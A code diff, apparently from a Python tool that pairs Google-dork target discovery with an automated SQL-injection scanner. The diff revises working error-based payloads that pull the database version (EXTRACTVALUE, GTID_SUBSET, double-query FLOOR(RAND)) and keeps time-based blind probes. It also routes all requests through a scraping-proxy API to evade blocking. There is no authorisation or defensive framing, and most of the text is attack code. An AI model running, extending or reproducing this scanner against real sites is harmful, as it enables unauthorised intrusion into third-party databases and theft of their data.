@@ -549,20 +549,18 @@ def build_custom_dorks(keywords, dork_type, site_type, page_param, max_count):
 #  SQL SCANNER (verified, XDumpGO-grade)
 # ──────────────────────────────────────────────
 
-PROBE_PAYLOADS = ["'", "\"", "')", "\\", "1'"]
+PROBE_PAYLOADS = ["'", "\"", "')"]
 
-CONFIRM_PAYLOADS = [
-    " AND 1=1--",
-    " AND 1=2--",
+CONFIRM_PAYLOADS_INT = [
     " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-    " AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
-    " AND UPDATEXML(1,CONCAT(0x7e,version(),0x7e),1)--",
     " OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
+    " AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
+]
+
+CONFIRM_PAYLOADS_STR = [
     "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
-    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
     "' OR GTID_SUBSET(CONCAT(0x7e,version(),0x7e),0)--",
-    " union select 1,2,3,4,5,6--",
-    " order by 100--",
+    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
 ]
 
 TIME_PAYLOADS = [
@@ -595,34 +593,38 @@ SQL_ERRORS = [
     "unknown column",
 ]
 
-SQL_TIMEOUT = aiohttp.ClientTimeout(total=12)
-
-BROWSER_UAS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
-]
+SQL_TIMEOUT = aiohttp.ClientTimeout(total=20)
+OXY_API = "https://realtime.oxylabs.io/v1/queries"
 
 def _make_headers():
-    return {
-        "User-Agent": random.choice(BROWSER_UAS),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "Cache-Control": "max-age=0",
-    }
+    return None
 
 async def _fetch(session, url, headers=None):
     try:
-        async with session.get(url, timeout=SQL_TIMEOUT, ssl=False, allow_redirects=True, headers=headers) as r:
-            body = await r.text(errors='ignore')
-            return r.status, body, len(body)
+        payload = {
+            "source": "universal",
+            "url": url,
+            "user_agent_type": "desktop_chrome",
+        }
+        async with session.post(
+            OXY_API,
+            auth=aiohttp.BasicAuth(OXY_USER, OXY_PASS),
+            json=payload,
+            timeout=SQL_TIMEOUT,
+        ) as r:
+            if r.status != 200:
+                return r.status, "", 0
+            data = await r.json()
+            body = ""
+            status_code = 200
+            for page in data.get("results", []):
+                body = page.get("content", "")
+                status_code = page.get("status_code", 200)
+            return status_code, body, len(body)
     except asyncio.TimeoutError:
         return 0, "", 0
-    except Exception:
+    except Exception as e:
+        logger.debug("_fetch err: %s — %s", url[:80], e)
         return -1, "", 0
 
 def _find_errors(body):
@@ -640,30 +642,34 @@ async def check_sql(session, url):
 
     base_part = url.split("?")[0]
     params = url.split("?")[1].split("&")
-    hdrs = _make_headers()
 
-    bs_status, bs_body, bs_len = await _fetch(session, url, hdrs)
+    injectable_params = [i for i in range(len(params)) if "=" in params[i]]
+    if not injectable_params:
+        return None
+
+    bs_status, bs_body, bs_len = await _fetch(session, url)
     if bs_status <= 0:
         return None
 
     bs_errors = set(_find_errors(bs_body))
 
-    for i in range(len(params)):
-        pname = params[i].split("=")[0] if "=" in params[i] else params[i]
+    for i in injectable_params:
+        pname = params[i].split("=")[0]
+        pval = params[i].split("=", 1)[1] if "=" in params[i] else ""
+        is_numeric = pval.isdigit()
+        confirm_list = CONFIRM_PAYLOADS_INT if is_numeric else CONFIRM_PAYLOADS_STR
 
-        # ── Phase 1: Probe with basic payloads ──
-        probe_hit = False
+        # ── Phase 1: Quick probe ──
         for payload in PROBE_PAYLOADS:
             test_url = _inject_param(base_part, params, i, payload)
-            status, body, blen = await _fetch(session, test_url, hdrs)
+            status, body, blen = await _fetch(session, test_url)
             if status <= 0:
                 continue
             new_errs = set(_find_errors(body)) - bs_errors
             if new_errs:
-                probe_hit = True
-                for cp in CONFIRM_PAYLOADS:
+                for cp in confirm_list:
                     cu = _inject_param(base_part, params, i, cp)
-                    cs, cb, cl = await _fetch(session, cu, hdrs)
+                    cs, cb, cl = await _fetch(session, cu)
                     if cs <= 0:
                         continue
                     cn = set(_find_errors(cb)) - bs_errors
@@ -671,33 +677,31 @@ async def check_sql(session, url):
                         return f"[VULN:Error-Based] [param:{pname}] {url}"
                 return f"[VULN:Error-Based] [param:{pname}] {url}"
 
-        # ── Phase 2: Direct confirm payloads ──
-        for payload in CONFIRM_PAYLOADS:
-            test_url = _inject_param(base_part, params, i, payload)
-            status, body, blen = await _fetch(session, test_url, hdrs)
-            if status <= 0:
+        # ── Phase 2: Direct extraction payloads ──
+        for cp in confirm_list:
+            cu = _inject_param(base_part, params, i, cp)
+            cs, cb, cl = await _fetch(session, cu)
+            if cs <= 0:
                 continue
-            new_errs = set(_find_errors(body)) - bs_errors
-            if new_errs:
+            cn = set(_find_errors(cb)) - bs_errors
+            if cn:
                 return f"[VULN:Error-Based] [param:{pname}] {url}"
-            ldiff = abs(blen - bs_len)
-            if "~" in body and ldiff > 100 and "0x7e" not in bs_body:
+            ldiff = abs(cl - bs_len)
+            if "~" in cb and ldiff > 100 and "~" not in bs_body:
                 return f"[VULN:Data-Extract] [param:{pname}] {url}"
-            if ldiff > 2000 and status != bs_status:
-                return f"[VULN:Boolean] [param:{pname}] {url}"
 
         # ── Phase 3: Time-based blind ──
         for tpl, db_type in TIME_PAYLOADS:
             short_url = _inject_param(base_part, params, i, tpl.format(delay=0))
             t1 = asyncio.get_event_loop().time()
-            s1, _, _ = await _fetch(session, short_url, hdrs)
+            s1, _, _ = await _fetch(session, short_url)
             time_short = asyncio.get_event_loop().time() - t1
             if s1 <= 0:
                 continue
 
             long_url = _inject_param(base_part, params, i, tpl.format(delay=5))
             t2 = asyncio.get_event_loop().time()
-            s2, _, _ = await _fetch(session, long_url, hdrs)
+            s2, _, _ = await _fetch(session, long_url)
             time_long = asyncio.get_event_loop().time() - t2
             if s2 <= 0:
                 continue
@@ -705,7 +709,7 @@ async def check_sql(session, url):
             if time_long >= 4.5 and time_long > time_short + 3.0:
                 verify_url = _inject_param(base_part, params, i, tpl.format(delay=3))
                 t3 = asyncio.get_event_loop().time()
-                s3, _, _ = await _fetch(session, verify_url, hdrs)
+                s3, _, _ = await _fetch(session, verify_url)
                 time_v = asyncio.get_event_loop().time() - t3
                 if time_v >= 2.5 and time_v > time_short + 1.5:
                     return f"[VULN:Time-Blind({db_type})] [param:{pname}] {url}"
